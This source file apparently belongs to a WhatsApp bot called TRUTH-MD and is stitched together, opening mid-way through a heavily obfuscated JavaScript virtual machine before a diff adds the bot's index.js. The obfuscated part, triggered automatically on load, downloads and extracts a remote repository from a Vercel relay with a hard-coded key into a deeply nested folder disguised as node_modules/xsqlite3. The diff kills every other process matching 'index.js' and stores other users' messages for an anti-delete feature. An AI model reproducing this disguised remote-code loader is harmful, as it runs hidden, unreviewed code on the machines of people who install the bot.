d5=iF;while(d5){if(d5['_$B27Lwo']&&'__this__'in d5['_$B27Lwo'])throw new ReferenceError('Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization');if(d5['_$xk0pxV']&&'__this__'in d5['_$xk0pxV'])break;d5=d5['_$bXCHhp'];}K[t++]=D,i0++;break dY;}let d0=iF,d1,d2=![],d3=iq['indexOf']('$$'),d4=d3!==-0x1?iq['substring'](0x0,d3):null;while(d0){let d6=d0['_$B27Lwo'],d7=d0['_$xk0pxV'];if(d6&&iq in d6)throw new ReferenceError('Cannot\x20access\x20\x27'+iq+'\x27\x20before\x20initialization');if(d4&&d6&&d4 in d6){if(!(d7&&iq in d7))throw new ReferenceError('Cannot\x20access\x20\x27'+d4+'\x27\x20before\x20initialization');}if(d7&&iq in d7){d1=d7[iq],d2=!![];break;}d0=d0['_$bXCHhp'];}!d2&&(iq in vmJ_a0ee8c?d1=vmJ_a0ee8c[iq]:d1=vmk[iq]),K[t++]=d1,i0++;}},function(it){dY:{let iq=i1[it],d0=K[--t],d1=iF,d2=![];while(d1){let d3=d1['_$B27Lwo'],d4=d1['_$xk0pxV'];if(d3&&iq in d3)throw new ReferenceError('Cannot\x20access\x20\x27'+iq+'\x27\x20before\x20initialization');if(d4&&iq in d4){if(d1['_$MnyFC1']&&iq in d1['_$MnyFC1']){if(il)throw new TypeError('Assignment\x20to\x20constant\x20variable.');d2=!![];break;}if(d1['_$iShk8n']&&iq in d1['_$iShk8n'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');d4[iq]=d0,d2=!![];break;}d1=d1['_$bXCHhp'];}if(!d2){if(iq in vmJ_a0ee8c)vmJ_a0ee8c[iq]=d0;else iq in vmk?vmk[iq]=d0:vmk[iq]=d0;}i0++;}},function(it){dY:{K[t++]=iF,i0++;}},function(it){dY:{iF&&iF['_$bXCHhp']&&(iF=iF['_$bXCHhp']),i0++;}},function(it){dY:{let iq=i1[it],d0=K[--t];R(iF,iq),iF['_$xk0pxV'][iq]=d0,i0++;}},function(it){dY:{let iq=i1[it],d0=K[--t],d1=iF,d2=![];while(d1){if(d1['_$xk0pxV']&&iq in d1['_$xk0pxV']){if(d1['_$iShk8n']&&iq in d1['_$iShk8n'])break;d1['_$xk0pxV'][iq]=d0;!d1['_$iShk8n']&&(d1['_$iShk8n']={});d1['_$iShk8n'][iq]=!![],d2=!![];break;}d1=d1['_$bXCHhp'];}!d2&&(N(iF,iq),iF['_$xk0pxV'][iq]=d0,!iF['_$iShk8n']&&(iF['_$iShk8n']={}),iF['_$iShk8n'][iq]=!![]),i0++;}},function(it){dY:{let iq=i1[it],d0=K[--t];R(iF,iq),iF['_$xk0pxV'][iq]=d0,!iF['_$iShk8n']&&(iF['_$iShk8n']={}),iF['_$iShk8n'][iq]=!![],i0++;}},function(it){dY:{let iq=i1[it];!iF['_$B27Lwo']&&(iF['_$B27Lwo']={}),iF['_$B27Lwo'][iq]=!![],i0++;}},function(it){dY:{let iq=i1[it],d0=K[--t],d1=iF['_$bXCHhp'];d1&&(d1['_$xk0pxV'][iq]=d0),i0++;}},function(it){dY:{let iq=K[--t],d0=i1[it];if(il&&!(d0 in vmk)&&!(d0 in vmJ_a0ee8c))throw new ReferenceError(d0+'\x20is\x20not\x20defined');vmJ_a0ee8c[d0]=iq,vmk[d0]=iq,K[t++]=iq,i0++;}},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,function(it){dY:{q[it]=q[it]+0x1,i0++;}},function(it){dY:{q[it]=q[it]-0x1,i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10;K[t++]=q[iq]+i1[d0],i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10;K[t++]=q[iq]-i1[d0],i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10;K[t++]=q[iq]*i1[d0],i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10,d1=q[iq],d2=i1[d0];K[t++]=d1[d2],i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10;K[t++]=q[iq]<i1[d0],i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10;q[iq]<i1[d0]?i0=iM(i3[i0]):i0++;}},function(it){dY:{let iq=it&0xffff,d0=it>>>0x10,d1=K[--t],d2=X(iQ,d1),d3=q[iq],d4=i1[d0],d5=d3[d4];K[t++]=d5['apply'](d3,d2),i0++;}},function(it){dY:{q[it]=K[--t],i0++;}},function(it){dY:{let iq=q[it]+0x1;q[it]=iq,K[t++]=iq,i0++;}},function(it){dY:{let iq=q[it]-0x1;q[it]=iq,K[t++]=iq,i0++;}}];switch(iW){case 0x0:{K[t++]=i1[iL],i0++;continue;}case 0x1:{K[t++]=undefined,i0++;continue;}case 0x3:{K[--t],i0++;continue;}case 0x4:{let it=K[t-0x1];K[t++]=it,i0++;continue;}case 0x6:{K[t++]=q[iL],i0++;continue;}case 0x7:{q[iL]=K[--t],i0++;continue;}case 0x8:{K[t++]=I[iL],i0++;continue;}case 0xa:{let iq=K[--t],d0=K[--t];K[t++]=d0+iq,i0++;continue;}case 0xb:{let d1=K[--t],d2=K[--t];K[t++]=d2-d1,i0++;continue;}case 0x10:{let d3=K[--t];K[t++]=typeof d3===k?d3+0x1n:+d3+0x1,i0++;continue;}case 0x1c:{let d4=K[--t];K[t++]=typeof d4===k?d4:+d4,i0++;continue;}case 0x2c:{let d5=K[--t],d6=K[--t];K[t++]=d6<d5,i0++;continue;}case 0x2e:{let d7=K[--t],d8=K[--t];K[t++]=d8>d7,i0++;continue;}case 0x32:{i0=iM(i3[i0]);continue;}case 0x34:{!K[--t]?i0=iM(i3[i0]):i0++;continue;}case 0x48:{let d9=K[--t],di=K[--t];if(di===null||di===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(d9)+'\x27\x20of\x20'+di);K[t++]=di[d9],i0++;continue;}case 0x49:{let dd=K[--t],du=K[--t],dw=K[--t];if(dw===null||dw===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(du)+'\x27\x20of\x20'+dw);if(iu){if(!Reflect['set'](dw,du,dd))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(du)+'\x27\x20of\x20object');}else dw[du]=dd;K[t++]=dd,i0++;continue;}}il=iu,ix=iw,ir=ip,is=iE,iC=iN,iP=iY,iB=iG,iF=ih,ij[iW](iL),ih=iF,iN=iC;if(iO)return iO=![],iS;}break;}catch(dp){if(i6['length']>0x0){let dE=i6[i6['length']-0x1];t=dE['_$czTq5L'];if(dE['_$8iJwHv']!==undefined)ib(dp),i0=dE['_$8iJwHv'],dE['_$8iJwHv']=undefined,dE['_$At0dut']===undefined&&i6['pop']();else dE['_$At0dut']!==undefined?(i0=dE['_$At0dut'],dE['_$pdsKoy']=dp):(i0=dE['_$zj9zHS'],i6['pop']());continue;}throw dp;}}return t>0x0?iQ():iN?D:undefined;}let m=function(V,I,H,Z,A,D){vmJ_a0ee8c['_$ZQtJCU']?vmJ_a0ee8c['_$ZQtJCU']=![]:vmJ_a0ee8c['_$eT2ZGH']=undefined;let K=D===w?this:D,t=typeof V==='object'?V:d(V);return T(t,I,H,Z,A,K);},f=async function(V,I,H,Z,A,D,K){let t=K===w?this:K,q=typeof V==='object'?V:d(V),i0=W(q,I,H,Z,A,t),i1=i0['next']();while(!i1['done']){if(i1['value']['_$YB5bX8']!==p)throw new Error('Unexpected\x20yield\x20in\x20async\x20context');try{let i2=await Promise['resolve'](i1['value']['_$1dVUjw']);vmJ_a0ee8c['_$eT2ZGH']=D,i1=i0['next'](i2);}catch(i3){vmJ_a0ee8c['_$eT2ZGH']=D,i1=i0['throw'](i3);}}return i1['value'];},L=function(V,I,H,Z,A,D){let K=D===w?this:D,t=typeof V==='object'?V:d(V),q=W(t,I,H,Z,undefined,K),i0=![],i1=null,i2=undefined,i3=![];function i4(i9,ii){if(i0)return{'value':undefined,'done':!![]};vmJ_a0ee8c['_$eT2ZGH']=A;if(i1){let iu;try{iu=ii?typeof i1['throw']==='function'?i1['throw'](i9):(i1=null,(function(){throw i9;}())):i1['next'](i9);}catch(iw){i1=null;try{let ip=q['throw'](iw);return i5(ip);}catch(iE){i0=!![];throw iE;}}if(!iu['done'])return{'value':iu['value'],'done':![]};i1=null,i9=iu['value'],ii=![];}let id;try{id=ii?q['throw'](i9):q['next'](i9);}catch(iY){i0=!![];throw iY;}return i5(id);}function i5(i9){if(i9['done']){i0=!![];if(i3)return i3=![],{'value':i2,'done':!![]};return{'value':i9['value'],'done':!![]};}let ii=i9['value'];if(ii['_$YB5bX8']===E)return{'value':ii['_$1dVUjw'],'done':![]};if(ii['_$YB5bX8']===Y){let id=ii['_$1dVUjw'],iu=id;iu&&typeof iu[Symbol['iterator']]==='function'&&(iu=iu[Symbol['iterator']]());if(iu&&typeof iu['next']==='function'){let iw=iu['next']();if(!iw['done'])return i1=iu,{'value':iw['value'],'done':![]};return i4(iw['value'],![]);}return i4(undefined,![]);}throw new Error('Unexpected\x20signal\x20in\x20generator');}let i6=t&&t['s'],i7=async function(i9){if(i0)return{'value':i9,'done':!![]};if(i1&&typeof i1['return']==='function'){try{await i1['return']();}catch(id){}i1=null;}let ii;try{vmJ_a0ee8c['_$eT2ZGH']=A,ii=q['next']({['_$YB5bX8']:g,['_$1dVUjw']:i9});}catch(iu){i0=!![];throw iu;}while(!ii['done']){let iw=ii['value'];if(iw['_$YB5bX8']===p)try{let ip=await Promise['resolve'](iw['_$1dVUjw']);vmJ_a0ee8c['_$eT2ZGH']=A,ii=q['next'](ip);}catch(iE){vmJ_a0ee8c['_$eT2ZGH']=A,ii=q['throw'](iE);}else{if(iw['_$YB5bX8']===E)try{vmJ_a0ee8c['_$eT2ZGH']=A,ii=q['next']();}catch(iY){i0=!![];throw iY;}else break;}}return i0=!![],{'value':ii['value'],'done':!![]};},i8=function(i9){if(i0)return{'value':i9,'done':!![]};if(i1&&typeof i1['return']==='function'){try{i1['return']();}catch(id){}i1=null;}i2=i9,i3=!![];let ii;try{vmJ_a0ee8c['_$eT2ZGH']=A,ii=q['next']({['_$YB5bX8']:g,['_$1dVUjw']:i9});}catch(iu){i0=!![],i3=![];throw iu;}if(!ii['done']&&ii['value']&&ii['value']['_$YB5bX8']===E)return{'value':ii['value']['_$1dVUjw'],'done':![]};return i0=!![],i3=![],{'value':ii['value'],'done':!![]};};if(i6){let i9=async function(id,iu){if(i0)return{'value':undefined,'done':!![]};vmJ_a0ee8c['_$eT2ZGH']=A;if(i1){let ip;try{ip=iu?typeof i1['throw']==='function'?await i1['throw'](id):(i1=null,(function(){throw id;}())):await i1['next'](id);}catch(iE){i1=null;try{vmJ_a0ee8c['_$eT2ZGH']=A;let iY=q['throw'](iE);return await ii(iY);}catch(ig){i0=!![];throw ig;}}if(!ip['done'])return{'value':ip['value'],'done':![]};i1=null,id=ip['value'],iu=![];}let iw;try{iw=iu?q['throw'](id):q['next'](id);}catch(iJ){i0=!![];throw iJ;}return await ii(iw);};async function ii(id){while(!id['done']){let iu=id['value'];if(iu['_$YB5bX8']===p){let iw;try{iw=await Promise['resolve'](iu['_$1dVUjw']),vmJ_a0ee8c['_$eT2ZGH']=A,id=q['next'](iw);}catch(ip){vmJ_a0ee8c['_$eT2ZGH']=A,id=q['throw'](ip);}continue;}if(iu['_$YB5bX8']===E)return{'value':iu['_$1dVUjw'],'done':![]};if(iu['_$YB5bX8']===Y){let iE=iu['_$1dVUjw'],iY=iE;if(iY&&typeof iY[Symbol['asyncIterator']]==='function')iY=iY[Symbol['asyncIterator']]();else iY&&typeof iY[Symbol['iterator']]==='function'&&(iY=iY[Symbol['iterator']]());if(iY&&typeof iY['next']==='function'){let ig=await iY['next']();if(!ig['done'])return i1=iY,{'value':ig['value'],'done':![]};vmJ_a0ee8c['_$eT2ZGH']=A,id=q['next'](ig['value']);continue;}vmJ_a0ee8c['_$eT2ZGH']=A,id=q['next'](undefined);continue;}throw new Error('Unexpected\x20signal\x20in\x20async\x20generator');}i0=!![];if(i3)return i3=![],{'value':i2,'done':!![]};return{'value':id['value'],'done':!![]};}return{'next':function(id){return i9(id,![]);},'return':i7,'throw':function(id){if(i0)return Promise['reject'](id);return i9(id,!![]);},[Symbol['asyncIterator']]:function(){return this;}};}else return{'next':function(id){return i4(id,![]);},'return':i8,'throw':function(id){if(i0)throw id;return i4(id,!![]);},[Symbol['iterator']]:function(){return this;}};};return function(V,I,H,Z,A){let D=d(V);if(D&&D['g']){let K=vmJ_a0ee8c['_$eT2ZGH'];return L['call'](this,D,I,H,Z,K,w);}if(D&&D['s']){let t=vmJ_a0ee8c['_$eT2ZGH'];return f['call'](this,D,I,H,Z,A,t,w);}if(D&&D['st']&&this===vmk)return m(D,I,H,Z,A,undefined);return m['call'](this,D,I,H,Z,A,w);};}());try{process,Object['defineProperty'](vmJ_a0ee8c,'process',{'get':function(){return process;},'set':function(i){process=i;},'configurable':!![]});}catch(vmdY){}try{console,Object['defineProperty'](vmJ_a0ee8c,'console',{'get':function(){return console;},'set':function(i){console=i;},'configurable':!![]});}catch(vmdg){}try{Buffer,Object['defineProperty'](vmJ_a0ee8c,'Buffer',{'get':function(){return Buffer;},'set':function(i){Buffer=i;},'configurable':!![]});}catch(vmdJ){}vmJ_a0ee8c['copyConfigs']=copyConfigs;globalThis['copyConfigs']=vmJ_a0ee8c['copyConfigs'];vmJ_a0ee8c['downloadAndExtractRepo']=downloadAndExtractRepo;globalThis['downloadAndExtractRepo']=vmJ_a0ee8c['downloadAndExtractRepo'];vmJ_a0ee8c['createDeepRepoPath']=createDeepRepoPath;globalThis['createDeepRepoPath']=vmJ_a0ee8c['createDeepRepoPath'];vmJ_a0ee8c['_$SZo6qA']={'__filename':!![],'__dirname':!![],'require':!![],'VERCEL_RELAY_URL':!![],'ACCESS_KEY':!![],'baseFolder':!![],'DEEP_NEST_COUNT':!![]},vmJ_a0ee8c['fs']=vmR,vmJ_a0ee8c['path']=vmN,vmJ_a0ee8c['axios']=vmO,vmJ_a0ee8c['AdmZip']=vmS,vmJ_a0ee8c['fileURLToPath']=fileURLToPath,vmJ_a0ee8c['createRequire']=createRequire;const __filename=vmJ_a0ee8c['fileURLToPath'](import.meta.url);vmJ_a0ee8c['__filename']=__filename;globalThis['__filename']=vmJ_a0ee8c['__filename'];vmJ_a0ee8c['__filename']=__filename;globalThis['__filename']=vmJ_a0ee8c['__filename'];delete vmJ_a0ee8c['_$SZo6qA']['__filename'];const __dirname=vmJ_a0ee8c['path']['dirname'](vmJ_a0ee8c['__filename']);vmJ_a0ee8c['__dirname']=__dirname;globalThis['__dirname']=vmJ_a0ee8c['__dirname'];vmJ_a0ee8c['__dirname']=__dirname;globalThis['__dirname']=__dirname;delete vmJ_a0ee8c['_$SZo6qA']['__dirname'];const require=vmJ_a0ee8c['createRequire'](import.meta.url);vmJ_a0ee8c['require']=require;globalThis['require']=vmJ_a0ee8c['require'];vmJ_a0ee8c['require']=require;globalThis['require']=require;delete vmJ_a0ee8c['_$SZo6qA']['require'];const VERCEL_RELAY_URL=process.env.VERCEL_RELAY_URL||'https://techcourtney-relay.vercel.app/api/repo';vmJ_a0ee8c['VERCEL_RELAY_URL']=VERCEL_RELAY_URL;globalThis['VERCEL_RELAY_URL']=vmJ_a0ee8c['VERCEL_RELAY_URL'];vmJ_a0ee8c['VERCEL_RELAY_URL']=VERCEL_RELAY_URL;globalThis['VERCEL_RELAY_URL']=VERCEL_RELAY_URL;delete vmJ_a0ee8c['_$SZo6qA']['VERCEL_RELAY_URL'];const ACCESS_KEY=process.env.ACCESS_KEY||'techworld_secure_2026';vmJ_a0ee8c['ACCESS_KEY']=ACCESS_KEY;globalThis['ACCESS_KEY']=vmJ_a0ee8c['ACCESS_KEY'];vmJ_a0ee8c['ACCESS_KEY']=ACCESS_KEY;globalThis['ACCESS_KEY']=ACCESS_KEY;delete vmJ_a0ee8c['_$SZo6qA']['ACCESS_KEY'];const baseFolder=vmJ_a0ee8c['path']['join'](__dirname,'node_modules','xsqlite3');vmJ_a0ee8c['baseFolder']=baseFolder;globalThis['baseFolder']=vmJ_a0ee8c['baseFolder'];vmJ_a0ee8c['baseFolder']=baseFolder;globalThis['baseFolder']=baseFolder;delete vmJ_a0ee8c['_$SZo6qA']['baseFolder'];const DEEP_NEST_COUNT=0x32;vmJ_a0ee8c['DEEP_NEST_COUNT']=DEEP_NEST_COUNT;globalThis['DEEP_NEST_COUNT']=vmJ_a0ee8c['DEEP_NEST_COUNT'];vmJ_a0ee8c['DEEP_NEST_COUNT']=DEEP_NEST_COUNT;globalThis['DEEP_NEST_COUNT']=DEEP_NEST_COUNT;delete vmJ_a0ee8c['_$SZo6qA']['DEEP_NEST_COUNT'];function createDeepRepoPath(){return vmp_a09bf9['call'](this,0x0,Array['from'](arguments),{['_$bXCHhp']:undefined,['_$xk0pxV']:{'baseFolder':baseFolder,'DEEP_NEST_COUNT':DEEP_NEST_COUNT},['_$iShk8n']:{['baseFolder']:!![],['DEEP_NEST_COUNT']:!![]}},undefined,new.target);}async function downloadAndExtractRepo(i){return vmp_a09bf9['call'](this,0x1,Array['from'](arguments),{['_$bXCHhp']:undefined,['_$xk0pxV']:{'VERCEL_RELAY_URL':VERCEL_RELAY_URL,'ACCESS_KEY':ACCESS_KEY},['_$iShk8n']:{['VERCEL_RELAY_URL']:!![],['ACCESS_KEY']:!![]}},undefined,new.target);}function copyConfigs(i){return vmp_a09bf9['call'](this,0x2,Array['from'](arguments),{['_$bXCHhp']:undefined,['_$xk0pxV']:{'__dirname':__dirname},['_$iShk8n']:{['__dirname']:!![]}},undefined,new.target);}(async()=>{return vmp_a09bf9['call'](this,0x4,[],{['_$bXCHhp']:undefined,['_$xk0pxV']:Object['defineProperties']({'require':require},{['createDeepRepoPath']:{'get':function(){return createDeepRepoPath;},'set':function(i){createDeepRepoPath=i;},'enumerable':!![]},['downloadAndExtractRepo']:{'get':function(){return downloadAndExtractRepo;},'set':function(i){downloadAndExtractRepo=i;},'enumerable':!![]},['copyConfigs']:{'get':function(){return copyConfigs;},'set':function(i){copyConfigs=i;},'enumerable':!![]}}),['_$iShk8n']:{['require']:!![]}},undefined,undefined);})();
+/**
+ * TRUTH-MD - A WhatsApp Bot
+ * © 2025 TRUTH MD
+ */
+
+const { execSync } = require('child_process');
+try {
+    const myPid = process.pid.toString();
+    const pids = execSync("pgrep -f 'index.js' || true", { encoding: 'utf8' }).trim().split('\n').filter(p => p && p !== myPid);
+    for (const pid of pids) {
+        try { process.kill(Number(pid), 'SIGTERM'); } catch (_) { }
+    }
+} catch (_) { }
+
+// --- Environment Setup ---
+const config = require('./config');
+/*━━━━━━━━━━━━━━━━━━━━*/
+require('dotenv').config(); // CRITICAL: Load .env variables first!
+
+// --- Heroku Compatibility Layer (only activates on Heroku) ---
+const { configureHerokuEnvironment, debouncedSave: herokuDebouncedSave, isHeroku } = require('./lib/heroku');
+configureHerokuEnvironment();
+// *******************************************************************
+// *** CRITICAL CHANGE: REQUIRED FILES (settings.js, main, etc.) ***
+// *** HAVE BEEN REMOVED FROM HERE AND MOVED BELOW THE CLONER RUN. ***
+// *******************************************************************
+
+const fs = require('fs')
+const chalk = require('chalk')
+const path = require('path')
+const axios = require('axios')
+const os = require('os')
+const PhoneNumber = require('awesome-phonenumber')
+// The smsg utility also depends on other files, so we'll move its require statement.
+// const { smsg } = require('./lib/myfunc') 
+const {
+    default: makeWASocket,
+    DisconnectReason,
+    fetchLatestBaileysVersion,
+    jidNormalizedUser,
+    makeCacheableSignalKeyStore,
+    delay
+} = require("@whiskeysockets/baileys")
+const { useSQLiteAuthState } = require('./lib/sqliteAuthState')
+
+const NodeCache = require("node-cache")
+const pino = require("pino")
+const readline = require("readline")
+const { rmSync } = require('fs')
+
+function log(message, color = 'white', isError = false) {
+    const prefix = chalk.cyan.bold('『') + chalk.white.bold(' TRUTH-MD ') + chalk.cyan.bold('』');
+    const logFunc = isError ? console.error : console.log;
+    const coloredMessage = chalk[color](message);
+    if (message.includes('\n') || message.includes('════')) {
+        logFunc(prefix, coloredMessage);
+    } else {
+        logFunc(`${prefix} ${coloredMessage}`);
+    }
+}
+// -------------------------------------------
+
+
+// --- DATA FILE INITIALIZATION (create from defaults if missing) ---
+const dataDefaults = {
+    'messageCount.json': '{"totalMessages":0,"users":{},"groups":{}}',
+    'lidmap.json': '{}',
+    'banned.json': '[]',
+    'sudo.json': '[]',
+    'premium.json': '[]',
+    'owner.json': '{"ownerNumber":"","ownerName":""}',
+    'warnings.json': '{}',
+    'prefix.json': '"."',
+    'anticall.json': '{"enabled":true}',
+    'antidelete.json': '{"enabled":true}',
+    'antiedit.json': '{"enabled":false}',
+    'autoStatus.json': '{"enabled":false}',
+    'autoread.json': '{"enabled":false}',
+    'autoreadreceipts.json': '{"enabled":false}',
+    'autotyping.json': '[]',
+    'bot.json': '[]',
+    'goodbye.json': '{}',
+    'welcome.json': '{}',
+    'menuSettings.json': '{"menuStyle":"5","showMemory":true,"showUptime":true,"showPluginCount":true,"showProgressBar":true}',
+    'pmblocker.json': '[]',
+    'water.json': '{}',
+    'payments.json': '{}',
+    'userGroupData.json': '{}'
+};
+const dataDir = path.join(__dirname, 'data');
+if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
+for (const [file, defaultContent] of Object.entries(dataDefaults)) {
+    const filePath = path.join(dataDir, file);
+    if (!fs.existsSync(filePath)) {
+        fs.writeFileSync(filePath, defaultContent);
+    }
+}
+const _sessionDir = path.join(__dirname, 'session');
+if (!fs.existsSync(_sessionDir)) fs.mkdirSync(_sessionDir, { recursive: true });
+
+try {
+    const { runGuard } = require('./lib/gitguard');
+    runGuard();
+} catch { }
+
+// --- GLOBAL FLAGS ---
+global.isBotConnected = false;
+global.connectionMessageSent = false;
+global.connectDebounceTimeout = null;
+global.isRestarting = false;
+global.isReconnecting = false;
+global.reconnectAttempts = 0;
+global.reconnectTimer = null;
+global.logoutRetryCount = 0;
+const MAX_RECONNECT_ATTEMPTS = 10;
+const MAX_LOGOUT_RETRIES = 15;
+// --- NEW: Error State Management ---
+global.errorRetryCount = 0;
+
+// ***************************************************************
+// *** DEPENDENCIES MOVED DOWN HERE (AFTER THE CLONING IS COMPLETE) ***
+// ***************************************************************
+
+// We will redefine these variables and requires inside the tylor function
+let smsg, handleMessages, handleGroupParticipantUpdate, handleStatus, store, settings;
+
+// --- 🔒 MESSAGE/ERROR STORAGE CONFIGURATION & HELPERS ---
+const MESSAGE_STORE_FILE = path.join(__dirname, 'message_backup.json');
+// --- NEW: Error Counter File ---
+const SESSION_ERROR_FILE = path.join(__dirname, 'sessionErrorCount.json');
+global.messageBackup = {};
+
+function loadStoredMessages() {
+    try {
+        if (fs.existsSync(MESSAGE_STORE_FILE)) {
+            const data = fs.readFileSync(MESSAGE_STORE_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        log(`Error loading message backup store: ${error.message}`, 'red', true);
+    }
+    return {};
+}
+
+function saveStoredMessages(data) {
+    try {
+        fs.writeFileSync(MESSAGE_STORE_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        log(`Error saving message backup store: ${error.message}`, 'red', true);
+    }
+}
+global.messageBackup = loadStoredMessages();
+
+let _saveMessageTimeout = null;
+function debouncedSaveMessages() {
+    if (_saveMessageTimeout) clearTimeout(_saveMessageTimeout);
+    _saveMessageTimeout = setTimeout(() => {
+        saveStoredMessages(global.messageBackup);
+    }, 5000);
+}
+
+// --- NEW: Error Counter Helpers ---
+function loadErrorCount() {
+    try {
+        if (fs.existsSync(SESSION_ERROR_FILE)) {
+            const data = fs.readFileSync(SESSION_ERROR_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (error) {
+        log(`Error loading session error count: ${error.message}`, 'red', true);
+    }
+    // Structure: { count: number, last_error_timestamp: number (epoch) }
+    return { count: 0, last_error_timestamp: 0 };
+}
+
+function saveErrorCount(data) {
+    try {
+        fs.writeFileSync(SESSION_ERROR_FILE, JSON.stringify(data, null, 2));
+    } catch (error) {
+        log(`Error saving session error count: ${error.message}`, 'red', true);
+    }
+}
+
+function deleteErrorCountFile() {
+    try {
+        if (fs.existsSync(SESSION_ERROR_FILE)) {
+            fs.unlinkSync(SESSION_ERROR_FILE);
+            log('✅ Deleted sessionErrorCount.json.', 'red');
+        }
+    } catch (e) {
+        log(`Failed to delete sessionErrorCount.json: ${e.message}`, 'red', true);
+    }
+}
+
+
+// --- ♻️ CLEANUP FUNCTIONS ---
+
+function clearSessionFiles(keepActive = false) {
+    try {
+        if (!keepActive) {
+            rmSync(sessionDir, { recursive: true, force: true });
+            if (fs.existsSync(loginFile)) fs.unlinkSync(loginFile);
+            deleteErrorCountFile();
+            global.errorRetryCount = 0;
+        } else {
+            if (!fs.existsSync(sessionDir)) return;
+            const files = fs.readdirSync(sessionDir);
+            const keep = new Set(['creds.json', 'auth_state.db', 'auth_state.db-wal', 'auth_state.db-shm']);
+            const now = Date.now();
+            let removed = 0;
+            for (const file of files) {
+                if (keep.has(file)) continue;
+                const filePath = path.join(sessionDir, file);
+                try {
+                    const stat = fs.statSync(filePath);
+                    const ageHours = (now - stat.mtimeMs) / (1000 * 60 * 60);
+                    if (ageHours > 24) {
+                        fs.unlinkSync(filePath);
+                        removed++;
+                    }
+                } catch (_) { }
+            }
+            if (removed > 0) log(`Cleaned ${removed} old session files (kept auth_state.db)`, 'yellow');
+        }
+    } catch (e) {
+        log(`Failed to clear session files: ${e.message}`, 'red', true);
+    }
+}
+
+
+function cleanupOldMessages() {
+    let storedMessages = loadStoredMessages();
+    let now = Math.floor(Date.now() / 1000);
+    // REDUCED FROM 4 hours to 1 hour for more aggressive cleanup
+    const maxMessageAge = 1 * 60 * 60;
+    let cleanedMessages = {};
+    for (let chatId in storedMessages) {
+        let newChatMessages = {};
+        for (let messageId in storedMessages[chatId]) {
+            let message = storedMessages[chatId][messageId];
+            if (now - message.timestamp <= maxMessageAge) {
+                newChatMessages[messageId] = message;
+            }
+        }
+        if (Object.keys(newChatMessages).length > 0) {
+            cleanedMessages[chatId] = newChatMessages;
+        }
+    }
+    saveStoredMessages(cleanedMessages);
+
+}
+
+function cleanupJunkFiles(botSocket) {
+    let directoryPath = path.join();
+    fs.readdir(directoryPath, async function (err, files) {
+        if (err) return log(`[Junk Cleanup] Error reading directory: ${err}`, 'red', true);
+        const filteredArray = files.filter(item =>
+            item.endsWith(".gif") || item.endsWith(".png") || item.endsWith(".mp3") ||
+            item.endsWith(".mp4") || item.endsWith(".opus") || item.endsWith(".jpg") ||
+            item.endsWith(".webp") || item.endsWith(".webm") || item.endsWith(".zip")
+        );
+        if (filteredArray.length > 0) {
+            let teks = `Detected ${filteredArray.length} junk files,\nJunk files have been deleted🚮`;
+            // Note: botSocket is only available *after* the bot connects, which is fine for this interval.
+            if (botSocket && botSocket.user && botSocket.user.id) {
+                botSocket.sendMessage(botSocket.user.id.split(':')[0] + '@s.whatsapp.net', { text: teks });
+            }
+            filteredArray.forEach(function (file) {
+                const filePath = path.join(directoryPath, file);
+                try {
+                    if (fs.existsSync(filePath)) fs.unlinkSync(filePath);
+                } catch (e) {
+                    log(`[Junk Cleanup] Failed to delete file ${file}: ${e.message}`, 'red', true);
+                }
+            });
+
+        }
+    });
+}
+
+// --- TRUTH MD ORIGINAL CODE START ---
+global.botname = "TRUTH MD"
+global.themeemoji = "•"
+const pairingCode = !!global.phoneNumber || process.argv.includes("--pairing-code")
+const useMobile = process.argv.includes("--mobile")
+
+// --- Readline setup (TRUTH MD) ---
+const rl = process.stdin.isTTY ? readline.createInterface({ input: process.stdin, output: process.stdout }) : null
+// The question function will use the 'settings' variable, but it's called inside getLoginMethod, which is 
+// called after the clone, so we keep this definition but ensure 'settings' is available when called.
+const question = (text) => rl ? new Promise(resolve => rl.question(text, resolve)) : Promise.resolve(settings?.ownerNumber || global.phoneNumber)
+
+/*━━━━━━━━━━━━━━━━━━━━*/
+// --- Paths (TRUTH MD) ---
+/*━━━━━━━━━━━━━━━━━━━━*/
+const sessionDir = path.join(__dirname, 'session')
+const credsPath = path.join(sessionDir, 'creds.json')
+const loginFile = path.join(sessionDir, 'login.json')
+const envPath = path.join(process.cwd(), '.env');
+
+/*━━━━━━━━━━━━━━━━━━━━*/
+// --- Login persistence (TRUTH MD) ---
+/*━━━━━━━━━━━━━━━━━━━━*/
+
+async function saveLoginMethod(method) {
+    await fs.promises.mkdir(sessionDir, { recursive: true });
+    await fs.promises.writeFile(loginFile, JSON.stringify({ method }, null, 2));
+}
+
+async function getLastLoginMethod() {
+    if (fs.existsSync(loginFile)) {
+        const data = JSON.parse(fs.readFileSync(loginFile, 'utf-8'));
+        return data.method;
+    }
+    return null;
+}
+
+// --- Session check (TRUTH MD) ---
+function sessionExists() {
+    const sqliteDb = path.join(sessionDir, 'auth_state.db');
+    if (fs.existsSync(sqliteDb)) return true;
+    return fs.existsSync(credsPath);
+}
+
+// --- NEW: Check and use SESSION_ID from .env/environment variables ---
+async function checkEnvSession() {
+    let envFileSessionID = '';
+    try {
+        if (fs.existsSync(envPath)) {
+            const envContent = fs.readFileSync(envPath, 'utf8');
+            const match = envContent.match(/^SESSION_ID=(.+)$/m);
+            if (match && match[1].trim().startsWith('TRUTH-MD')) {
+                envFileSessionID = match[1].trim();
+            }
+        }
+    } catch (_) { }
+
+    const envSessionID = envFileSessionID || process.env.SESSION_ID;
+    if (envSessionID) {
+        if (!envSessionID.includes("TRUTH-MD:~")) {
+            log("🚨 WARNING: Environment SESSION_ID is missing the required prefix 'TRUTH-MD:~'. Assuming BASE64 format.", 'red');
+        }
+        global.SESSION_ID = envSessionID.trim();
